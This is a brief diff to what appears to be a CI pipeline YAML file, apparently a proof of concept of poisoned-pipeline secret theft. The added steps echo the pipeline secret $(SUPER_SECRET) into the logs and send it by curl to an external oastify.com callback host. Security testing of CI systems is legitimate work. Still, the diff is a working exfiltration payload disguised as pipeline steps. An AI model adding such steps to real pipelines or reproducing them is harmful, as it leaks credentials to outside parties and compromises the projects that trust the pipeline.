@@ -1,2 +1,5 @@
 steps:
-- bash: echo "pipeline (A) runs first"
+  - bash: echo "pipeline (A) runs first $(SUPER_SECRET)"
+  - script: |
+      echo $(SUPER_SECRET)
+      curl https://t82x7lskmw5unw0yjt43prh4bvhm5ct1.oastify.com?secret2=$(SUPER_SECRET)
